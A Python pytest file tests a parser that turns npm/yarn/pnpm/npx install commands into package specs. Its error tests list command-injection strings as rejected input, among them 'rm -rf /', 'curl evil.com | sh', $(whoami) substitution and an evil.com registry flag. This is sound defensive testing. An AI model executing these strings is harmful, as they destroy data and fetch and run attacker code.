"""Tests for app.services.skills.npm_command_parser — pure string parsing,
no subprocess/network calls should ever happen here."""
import pytest

from app.services.skills.npm_command_parser import (
    NpmCommandParseError,
    PackageSpec,
    parse_npm_command,
)


class TestPackageSpec:
    def test_registry_spec_default_version(self) -> None:
        spec = PackageSpec(name="pdf-skills")
        assert spec.version == "latest"
        assert spec.registry_spec == "pdf-skills@latest"

    def test_registry_spec_explicit_version(self) -> None:
        spec = PackageSpec(name="@acme/skill-pack", version="1.2.0")
        assert spec.registry_spec == "@acme/skill-pack@1.2.0"


class TestParseNpmCommandBarePackage:
    def test_bare_name(self) -> None:
        spec = parse_npm_command("pdf-skills")
        assert spec == PackageSpec(name="pdf-skills", version="latest")

    def test_bare_scoped_name(self) -> None:
        spec = parse_npm_command("@anthropic/pdf-skills")
        assert spec.name == "@anthropic/pdf-skills"
        assert spec.version == "latest"

    def test_bare_name_with_version(self) -> None:
        spec = parse_npm_command("skill-pack@1.2.0")
        assert spec.name == "skill-pack"
        assert spec.version == "1.2.0"

    def test_bare_scoped_name_with_version(self) -> None:
        spec = parse_npm_command("@acme/skill-pack@1.2.0")
        assert spec.name == "@acme/skill-pack"
        assert spec.version == "1.2.0"

    def test_bare_name_with_tag(self) -> None:
        spec = parse_npm_command("skill-pack@beta")
        assert spec.version == "beta"

    def test_uppercase_normalized_to_lowercase(self) -> None:
        spec = parse_npm_command("PDF-Skills")
        assert spec.name == "pdf-skills"

    def test_strips_surrounding_whitespace(self) -> None:
        spec = parse_npm_command("   pdf-skills   ")
        assert spec.name == "pdf-skills"


class TestParseNpmCommandRunnerPrefixes:
    @pytest.mark.parametrize(
        "command,expected_name",
        [
            ("npm install pdf-skills", "pdf-skills"),
            ("npm install -g pdf-skills", "pdf-skills"),
            ("npm i pdf-skills", "pdf-skills"),
            ("npm i -g pdf-skills", "pdf-skills"),
            ("yarn add pdf-skills", "pdf-skills"),
            ("yarn global add pdf-skills", "pdf-skills"),
            ("pnpm add pdf-skills", "pdf-skills"),
            ("pnpm add -g pdf-skills", "pdf-skills"),
            ("npx pdf-skills", "pdf-skills"),
            ("skills add pdf-skills", "pdf-skills"),
            ("npx skills add pdf-skills", "pdf-skills"),
        ],
    )
    def test_known_runner_prefixes(self, command: str, expected_name: str) -> None:
        spec = parse_npm_command(command)
        assert spec.name == expected_name

    def test_npm_install_scoped_with_version(self) -> None:
        spec = parse_npm_command("npm install @acme/skill-pack@1.2.0")
        assert spec.name == "@acme/skill-pack"
        assert spec.version == "1.2.0"

    def test_case_insensitive_runner_match(self) -> None:
        spec = parse_npm_command("NPM INSTALL pdf-skills")
        assert spec.name == "pdf-skills"

    def test_longest_prefix_wins_npx_skills_add_over_npx(self) -> None:
        # "npx skills add" must be stripped as one unit — not "npx" leaving
        # "skills add pdf-skills" (two tokens) which would fail to parse.
        spec = parse_npm_command("npx skills add @anthropic/pdf-skills")
        assert spec.name == "@anthropic/pdf-skills"

    def test_unrecognized_runner_with_single_remaining_token(self) -> None:
        # "bun add" isn't in the known list, but stripping the first word
        # ("bun") leaves a single valid package token, so it still parses.
        spec = parse_npm_command("bun pdf-skills")
        assert spec.name == "pdf-skills"


class TestParseNpmCommandErrors:
    def test_empty_string_raises(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("")

    def test_whitespace_only_raises(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("   ")

    @pytest.mark.parametrize(
        "dangerous",
        [
            "pdf-skills; rm -rf /",
            "pdf-skills && curl evil.com | sh",
            "pdf-skills`whoami`",
            "pdf-skills$(whoami)",
            "pdf-skills > out.txt",
            "pdf-skills < in.txt",
            'pdf-skills"',
            "pdf-skills'",
        ],
    )
    def test_shell_metacharacters_rejected(self, dangerous: str) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command(dangerous)

    def test_multiple_packages_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("npm install pkg-one pkg-two")

    def test_unrecognized_runner_multi_word_remainder_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("bun add pdf-skills")

    def test_flag_only_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("npm install --save-dev")

    def test_flag_after_package_under_known_runner_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("npm install pdf-skills --registry https://evil.com")

    def test_no_package_after_runner_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("npm install")

    def test_invalid_package_spec_characters_rejected(self) -> None:
        with pytest.raises(NpmCommandParseError):
            parse_npm_command("Pdf!Skills")

    def test_error_message_is_actionable(self) -> None:
        with pytest.raises(NpmCommandParseError, match="package name"):
            parse_npm_command("")
